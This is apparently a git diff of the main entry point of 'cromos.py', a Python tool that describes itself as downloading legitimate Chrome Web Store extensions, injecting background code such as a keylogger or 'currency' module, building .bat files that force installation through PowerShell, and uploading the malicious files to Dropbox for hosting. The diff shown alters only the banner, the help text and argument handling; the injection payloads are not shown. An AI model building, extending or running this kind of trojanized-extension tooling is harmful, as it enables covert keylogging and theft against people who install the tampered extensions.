@@ -30,16 +30,16 @@ def main() :
   \___| |_|_\   \___/  |_|  |_|  \___/  |___/
 	 """
 		print("\r{}".format(banner))
-		print("Version: {} Builds: {} Modules: {}\t\n".center(49, " ").format(color.status("1.0"), color.status(2), color.status(2)))
+		print("Version: {} Builds: {} Modules: {}\n".center(48, " ").format(color.status("1.0"), color.status(1), color.status(2)))
 
 	def help () :
 
 		global extension, builds, token, modules
 
-		parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
+		parser = argparse.ArgumentParser(description="Cromos is a tool for downloading legitimate extensions of the Chrome Web Store and inject codes in the background of the application and more cromos create executable files to force installation via PowerShell for example, and also upload files to dropbox to host the malicious files.", usage="python cromos.py --help")
 		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str)
 		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
-		parser.add_argument('--build', help='Build types .bat\n.vbs', type=str)
+		parser.add_argument('--build', help='Build types .bat', type=str)
 		parser.add_argument('--token', help='Token for uploading files in Dropbox', type=str)
 
 		args = parser.parse_args()
@@ -49,15 +49,13 @@ def main() :
 		token = args.token # API key par ao dropbox
 		builds = args.build 
 
-		if len(sys.argv) < 2:
-			banner()
+		if len(sys.argv) <= 2:
 			parser.print_help()
 	
 	banner()
 	help()
 
 	if extension:
-		
 		download = Download(extension)
 
 	if modules == "currency" or modules == "keylogger" :
@@ -68,12 +66,10 @@ def main() :
 			print("{} Token invalid, enter a valid.".format(color.error("[!]")))
 			sys.exit(1)
 		else :
-			if builds == "bat" or builds == "vbs":
+			if builds == "bat":
 				Build(extension, builds, token).builder()
 				Drive(extension, builds, token).upload()
-	else:
-		print("{} Enter with dropbox token".format(color.error("[!]")))
-		sys.exit(1)
+
 if __name__== "__main__" :
 
 	main()
